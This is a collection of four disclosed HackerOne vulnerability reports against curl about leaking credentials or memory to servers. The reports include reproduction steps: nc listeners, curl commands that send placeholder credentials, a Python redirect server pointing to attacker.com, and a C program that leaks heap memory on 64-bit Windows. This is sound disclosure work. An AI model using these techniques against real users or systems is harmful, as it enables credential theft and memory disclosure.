# Information Exposure Through Sent Data

_4 reports — High/Critical, disclosed_

### [Alt-Svc bypasses credential leak protection (CVE-2018-1000007)](https://hackerone.com/reports/3485826)

- **Report ID:** `3485826`
- **Severity:** High
- **Weakness:** Information Exposure Through Sent Data
- **Program:** curl
- **Reporter:** @amik_f
- **Bounty:** - usd
- **Disclosed:** 2026-01-04T10:34:02.397Z
- **CVE(s):** CVE-2018-1000007

**Vulnerability Information:**

## Summary
I found a bug where curl's Alt-Svc implementation fails to strip sensitive authentication headers (Authorization and Cookies) when remapping a connection to a different host or port. This essentially bypasses the security fix for CVE-2018-1000007.

While auditing the code, I noticed that Alt-Svc remappings in `lib/url.c` update `conn->conn_to_host.name` and `conn->conn_to_port`, but the authentication guard in `lib/vauth/vauth.c` (the `Curl_auth_allowed_to_host` function) only checks the original `conn->host.name` and `conn->remote_port`.

Additionally, Alt-Svc remappings do not set the `data->state.this_is_a_follow` flag. Since the auth guard only activates when this flag is TRUE, the entire credential protection logic is skipped for Alt-Svc "redirects."

## Affected version
curl 8.17.0 (x86_64-pc-linux-gnu) libcurl/8.17.0 OpenSSL/3.5.4
(Tested on Kali Linux, but affects all versions with Alt-Svc enabled)

## Steps To Reproduce
I've attached a reproduction script `final_comparison_poc.py` that demonstrates the issue by comparing a standard 302 redirect (which is secure) against an Alt-Svc remapping (which leaks credentials).

1. Set up a listener on port 8443 (Production) and port 9443 (Attacker).
2. Request `https://localhost:8443/` with credentials and an Alt-Svc header pointing to `localhost:9443`.
3. Make a second request to the same URL using the Alt-Svc cache.
4. Observe that the credentials are sent to port 9443.

## Supporting Material/References
I've verified the code mismatch in the source:

In `lib/vauth/vauth.c`:
```c
return !data->state.this_is_a_follow ||
       data->set.allow_auth_to_other_hosts ||
       (data->state.first_host &&
        curl_strequal(data->state.first_host, conn->host.name) &&
        (data->state.first_remote_port == conn->remote_port) ...
```

The fix should involve checking the effective host/port handled by Alt-Svc, similar to the pattern in `url.c:3235`:
```c
const char *check_host = conn->bits.conn_to_host ?
                         conn->conn_to_host.name : conn->host.name;
int check_port = conn->bits.conn_to_port ?
                 conn->conn_to_port : conn->remote_port;
```

---

## Impact

## Summary
An attacker controlling an HTTPS server can steal sensitive `Authorization` headers and session `Cookies` from clients by serving a malicious `Alt-Svc` header. Since curl caches Alt-Svc entries, this leak is persistent and will affect future requests to the same origin, even if they would otherwise be secure. This is a direct functional bypass of the security boundary established in CVE-2018-1000007.

---

### [Proxy-Authorization header is leaked to origin server after redirect from proxied to direct connection](https://hackerone.com/reports/3480713)

- **Report ID:** `3480713`
- **Severity:** High
- **Weakness:** Information Exposure Through Sent Data
- **Program:** curl
- **Reporter:** @yupiy
- **Bounty:** - usd
- **Disclosed:** 2025-12-30T08:41:26.235Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

curl leaks the Proxy-Authorization header to the origin server after following an HTTP redirect that transitions from a proxied connection to a direct connection (e.g. when using --noproxy or when proxy is bypassed after redirect). This causes proxy credentials (which are hop-by-hop) to be sent to unintended servers.

## Affected version

Tested with:
curl 8.17.0 on Linux x86_64

curl -V:
[PASTE curl -V OUTPUT HERE]

## Steps To Reproduce

1. Start a fake origin server:

   nc -l -p 8080

2. Start a fake proxy that redirects to the origin:

   printf "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:8080/\r\nContent-Length: 0\r\n\r\n" | nc -l -p 3128

3. Run curl:

   curl -v -L \
     -x http://127.0.0.1:3128 \
     -H "Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR" \
     --noproxy 127.0.0.1 \
     http://example.com

4. Observe the request received by the origin server.

## Observed Behavior

### curl verbose output:

*   Trying 127.0.0.1:3128...
* Established connection to 127.0.0.1 (127.0.0.1 port 3128)
> GET http://example.com/ HTTP/1.1
> Host: example.com
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
>
< HTTP/1.1 302 Found
< Location: http://127.0.0.1:8080/
< Content-Length: 0
* Issue another request to this URL: 'http://127.0.0.1:8080/'
*   Trying 127.0.0.1:8080...
* Established connection to 127.0.0.1 (127.0.0.1 port 8080)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.17.0
> Accept: */*
> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

### Origin server output (nc -l -p 8080):

GET / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: curl/8.17.0
Accept: */*
Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR

## Expected Behavior

The Proxy-Authorization header must never be forwarded to origin servers and should be stripped when the request is sent directly instead of via a proxy.


## Supporting Material

Attached:
- curl verbose output showing header leakage
- Origin server log showing leaked Proxy-Authorization header

## Impact

## Impact

An attacker-controlled origin server can steal proxy credentials if a proxied request is redirected to a direct connection. This violates HTTP semantics (Proxy-Authorization is hop-by-hop) and can result in credential compromise and unauthorized proxy access.

---

### [Authorization Header Leak via --location-trusted in Curl](https://hackerone.com/reports/2946924)

- **Report ID:** `2946924`
- **Severity:** High
- **Weakness:** Information Exposure Through Sent Data
- **Program:** curl
- **Reporter:** @voggerloops
- **Bounty:** - usd
- **Disclosed:** 2025-07-03T06:43:09.591Z
- **CVE(s):** -

**Vulnerability Information:**

Curl's --location-trusted Option Leaks Authorization Header Across Domains
The `--location-trusted` option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.

- If an attacker controls a redirecting endpoint, they can steal credentials from any requests using Basic Auth.
- Unlike `--location`, which strips authentication headers for security, `--location-trusted` forwards them without warning, leading to unintended  
credential leakage.
This violates authentication best practices and introduces a serious security risk

---

Affected Versions
Run:

curl -V

 **Example Output:**

curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.10 zlib/1.3.1
Release-Date: 2024-01-15

 **Tested on:**
-  Linux (Ubuntu 22.04)
-  macOS 14 Sonoma
-  Windows 11 (WSL2)

---
 ** Steps to Reproduce**

 **Start a Malicious Redirect Server**
Run this Python script on an attacker-controlled machine:
 python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://attacker.com")
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8080), RedirectHandler)
server.serve_forever()
```

 Run Curl with Authentication & --location-trusted
Execute:
curl -v -L --user "admin:password" --location-trusted http://localhost:8080
`

---

 Expected Behavior
- Curl should strip the Authorization header  when redirecting to a  different domain.

 Actual Behavior
- Curl forwards the Authorization header to `attacker.com`, exposing credentials.

---

Supporting Material / References
 Curl Debug Log (`-v --trace curl_trace.txt`) – Shows leaked Authorization header  
Packet Capture (`tcpdump`/Wireshark)– Confirms credentials are sent cross-origin  
 PoC Python Code (`redirect_poc.py`) – Reproduces the vulnerability locally  

---

 Impact: What an Attacker Can Achieve
 Credential Exposure:
- Any Basic Authentication credentials (API keys, admin passwords, cloud service tokens) are leaked if an attacker controls the redirect.

 Privilege Escalation:
- Attackers can gain unauthorized access to admin interfaces, APIs, or cloud services, leading to 
full system compromise

 DevOps & CI/CD Pipeline Risk:
- Automation scripts & DevOps pipelines using `curl` may unknowingly expose credentials to untrusted redirect targets

---

 Suggested Fix
 Immediate Workaround for Affected Users
Avoid`--location-trusted` when authentication is involved  
Manually follow redirects by parsing `curl -i` output  
Use API tokens instead of Basic Auth where possible  

 Permanent Fix for Curl Developers
Automatically strip Authorization headers for cross-origin redirect
Update documentation to warn users about risks of `--location-trusted` 
Display security warnings before forwarding authentication credentials  

---
Final Thoughts
This vulnerability exposes sensitive credentials to untrusted third parties, which can lead to **credential theft, account takeovers, and security breaches Fixing this issue will help protect automation scripts, CI/CD pipelines, and security-conscious developers from unintentionally leaking credentials.

## Impact

The location-trusted option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.

This behavior creates a security risk where an attacker controlling a redirecting endpoint can steal credentials from any request using Basic Auth. Unlike --location, which strips authentication headers for security reasons, --location-trusted forwards them without warning, leading to unintended credential leakage.

This issue violates authentication best practices and could lead to credential theft, privilege escalation, and security breaches, particularly affecting DevOps pipelines, automation scripts, and CI/CD environments that rely on Curl.

The recommended fix is to automatically strip Authorization headers for cross-origin redirects, warn users about the risks of --location-trusted, and update documentation to reflect this issue.

---

### [ Remote memory disclosure vulnerability in libcurl on 64 Bit Windows](https://hackerone.com/reports/1444539)

- **Report ID:** `1444539`
- **Severity:** High
- **Weakness:** Information Exposure Through Sent Data
- **Program:** curl
- **Reporter:** @nsq11
- **Bounty:** - usd
- **Disclosed:** 2022-02-21T09:15:57.017Z
- **CVE(s):** -

**Vulnerability Information:**

# Remote memory disclosure vulnerability in libcurl on 64 Bit Windows

## Summary:

`libcurl` (latest) contains a vulnerability that enables attackers to
remotely read memory beyond the bounds of a buffer in the style of the
infamous "heartbleed" vulnerability. Luckily, however, this is only
possible when `libcurl` runs on 64 bit Windows and it requires an
attacker capable of influencing the size of a file upload part.

The core of the problem is the following: while on 64 Linux and BSD
systems, `sizeof(long)` is 8, on 64 bit Windows, it
is 4. Consequently, the function `AddHttpPost` carries out an integer
truncation and sign conversion on these systems, as the parameter
`bufferlength` of type `size_t` (8 byte wide, unsigned) is assigned to
the field `post->bufferlength` of type `long` (4 byte wide,
signed). The following excerpt shows the corresponding code:


```
static struct curl_httppost *
AddHttpPost(char *name, size_t namelength,
            char *value, curl_off_t contentslength,
            char *buffer, size_t bufferlength,
	        [...]
            struct curl_httppost **last_post)
{
	[...]
    post->buffer = buffer;
    post->bufferlength = (long)bufferlength; /* <=== */ 
	[...]
}
```

In particular, this function is triggered when constructing an HTTP
POST request that specifies custom file upload parts, e.g., with a
statement such as the following:

```
curl_formadd(&formpost,
             &lastptr,
             CURLFORM_COPYNAME, "name",
             CURLFORM_BUFFER, "data",
             CURLFORM_BUFFERPTR, buffer,
             CURLFORM_BUFFERLENGTH, size,
             CURLFORM_END);
```

An attacker capable of choosing the file to upload may choose for it
to be 4294967295 in size, and, indeed, `libcurl` will transfer this
file without trouble on 64 bit Linux. On 64 bit Windows, however, this
leads to `post->bufferlength` being -1 due to the
truncation/sign-conversion, which happens to also be the value of the
constant `CURL_ZERO_TERMINATED`. On posting the data, this undesirable
interpretation causes the function `curl_mime_data` to assume that the
length of the buffer to upload is not known and should be determined
via `strlen`. Assuming the buffer does not contain zero bytes - and in
fact, the documentation states that it MAY NOT contain zero bytes,
`strlen` will read beyond the bounds of the buffer `buffer`, and
subsequently transmit the buffer contents AND memory behind it to the
HTTP server.

The following (commented) excerpt of `curl_mime_data` illustrates this
behavior:

```
CURLcode curl_mime_data(curl_mimepart *part, /* <=== */ 
                        const char *data, size_t datasize)
{
   [...]

  if(data) {
    // This branch is triggered when `datasize` is -1,
	// Note that `datasize` is again `size_t`, so, it will
	// then be > 2**32-1.
    if(datasize == CURL_ZERO_TERMINATED)
      datasize = strlen(data);

	// With a system that has > 4GB RAM, this allocation
	// succeeds.
    part->data = malloc(datasize + 1);
    if(!part->data)
      return CURLE_OUT_OF_MEMORY;

	// The part size is now set to be larger than 2**32-1,
	// although 2**32-1 is the size of the file. 
    part->datasize = datasize;

```

## Steps To Reproduce:

To further illustrate the problem, I have created a sample application
for which the string "secret" is located directly after the
to-be-transmitted buffer. On 64 bit Linux, the program correctly
transmits only the contents of the buffer. On 64 bit Windows, it
transmits the buffer contents and the string "secret". Logging network
traffic using `tcpdump`, this has been confirmed as the attached
screenshots show.

The following is the sample program (test.c), which compiles both on Linux
and Windows (Visual Studio 2022 Community Edition).

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

int main(void)
{
    CURL* curl;
    CURLM* multi_handle;
    int still_running = 0;
    struct curl_httppost* formpost = NULL;
    struct curl_httppost* lastptr = NULL;
    struct curl_slist* headerlist = NULL;
    static const char buf[] = "Expect:";

    // Place 4294967295 'A's on the heap (the buffer to transmit),
    // followed by the string "secret". If we now instruct libcurl
    // to transfer 4294967295, it should only transfer 'A's.
    
    size_t size = (size_t) 0xffffffff;
    char* buffer = (char*)malloc(size + strlen("secret") + 1);    
    memset(buffer, 'A', size);    
    memcpy(buffer + size, "secret", strlen("secret"));
    buffer[size + strlen("secret")] = '\0';

    // Instruct curl to send the buffer, specifying its size
    // to be 4294967295 (size)
    
    int ret = curl_formadd(&formpost,
        &lastptr,
        CURLFORM_COPYNAME, "name",
        CURLFORM_BUFFER, "data",
        CURLFORM_BUFFERPTR, buffer,
        CURLFORM_BUFFERLENGTH, size,
        CURLFORM_END);

    // The return value is 0 (success)
    printf("%d\n", ret);
    
    curl = curl_easy_init();
    multi_handle = curl_multi_init();    
    headerlist = curl_slist_append(headerlist, buf);
    if (curl && multi_handle) {
      // We are uploading to a local webserver, but this can be any webserver.
      // upload.cgi can be an empty file.
      curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.216/upload.cgi");
      curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
      curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);      
      curl_multi_add_handle(multi_handle, curl);      
      do {
            CURLMcode mc = curl_multi_perform(multi_handle, &still_running);	    
            if (still_running)
	      /* wait for activity, timeout or "nothing" */
	      mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);	    
            if (mc)
	      break;	    
      } while (still_running);      
      curl_multi_cleanup(multi_handle);
      curl_easy_cleanup(curl);
      curl_formfree(formpost);
      curl_slist_free_all(headerlist);
    }
    return 0;
}
```

As suggested patch would be to use the type `long long` as opposed to
`long` for the buffer length. `long long` is guaranteed to be 8 byte
wide on Linux and Windows 64 bit systems.

## Impact

An attacker could read memory from the process remotely, meaning that any information processed by the program using libcurl may be disclosed. Depending on the application, this information may be sensitive, e.g., passwords, keys could be in memory. In addition, reading memory offsets may be useful to identify memory mappings remotely in preparation for a memory corruption exploits that requires bypassing of ASLR.

---
